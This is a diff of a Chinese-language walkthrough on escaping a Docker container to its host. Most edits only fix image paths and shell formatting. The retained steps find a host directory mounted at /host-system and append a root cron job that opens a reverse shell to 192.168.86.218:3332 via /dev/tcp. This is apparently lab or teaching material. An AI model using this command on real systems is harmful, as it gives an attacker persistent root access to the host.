@@ -16,7 +16,7 @@ Container escape to the host system
 
 判断环境
 
-![image-20231120170301134](C:\Users\12095\AppData\Roaming\Typora\typora-user-images\image-20231120170301134.png)
+![image-20231120172906719](./assets/image-20231120172906719.png)
 
 发现是在docker
 
@@ -24,7 +24,7 @@ Container escape to the host system
 mount \| grep '/ type'
 ```
 
-![image-20231120170304868](C:\Users\12095\AppData\Roaming\Typora\typora-user-images\image-20231120170304868.png)
+![](./assets/image-20231120172910564.png)
 
  
 
@@ -55,18 +55,16 @@ mount \| grep '/ type'
 这里我们从最简单的开始目录挂载\[输入以下命令\]
 
 ```shell
-mount \| grep 'type fuse'
-
+mount | grep 'type fuse'
 Or
-
 df -h
 ```
 
-![image-20231120170330334](C:\Users\12095\AppData\Roaming\Typora\typora-user-images\image-20231120170330334.png)
+![image-20231120172922758](./assets/image-20231120172922758.png)
 
 发现挂载目录是/host-system
 
-![image-20231120170334805](C:\Users\12095\AppData\Roaming\Typora\typora-user-images\image-20231120170334805.png)
+![image-20231120172926719](./assets/image-20231120172926719.png)
 
  
 
@@ -78,7 +76,7 @@ df -h
 cat /host-system/etc/crontab
 ```
 
-![image-20231120170421253](C:\Users\12095\AppData\Roaming\Typora\typora-user-images\image-20231120170421253.png)
+![image-20231120172932299](./assets/image-20231120172932299.png)
 
 生成在线反弹shell
 
@@ -92,13 +90,13 @@ cat /host-system/etc/crontab
 echo "\* \* \* \* \* root bash -i \>& /dev/tcp/192.168.86.218/3332 0\>&1" \>\>/host-system/etc/crontab
 ```
 
-![image-20231120170425159](C:\Users\12095\AppData\Roaming\Typora\typora-user-images\image-20231120170425159.png)
+![image-20231120172939654](./assets/image-20231120172939654.png)
 
  
 
 写入成功
 
-![image-20231120170434911](C:\Users\12095\AppData\Roaming\Typora\typora-user-images\image-20231120170434911.png)
+![image-20231120172942919](./assets/image-20231120172942919.png)
 
  
 
